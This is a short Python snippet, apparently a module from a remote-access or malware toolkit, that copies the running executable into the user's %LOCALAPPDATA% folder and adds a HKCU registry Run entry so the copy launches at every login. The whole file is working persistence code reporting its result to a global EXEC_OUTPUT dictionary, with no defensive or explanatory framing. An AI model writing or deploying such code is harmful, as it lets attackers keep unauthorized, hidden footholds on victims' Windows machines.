def main(info):
    print(info)
    global EXEC_OUTPUT
    import os
    import sys
    import subprocess
    
    base_dst = os.path.expandvars("%LOCALAPPDATA%")

    display_name = info
    filepath_src = sys.argv[0]
    filepath_dst = f"{base_dst}\\{info.lower()}.exe"
    
    
    with open(filepath_src, "rb") as f:
        stuff = f.read()
        with open(filepath_dst, "wb") as f:
            f.write(stuff)
    cmd = f"reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v {display_name} /t REG_SZ /f /d \"{filepath_dst}\""
    subprocess.Popen(cmd.split(" "))
    EXEC_OUTPUT["output"] = "Done."
    EXEC_OUTPUT["success"] = True
main(info)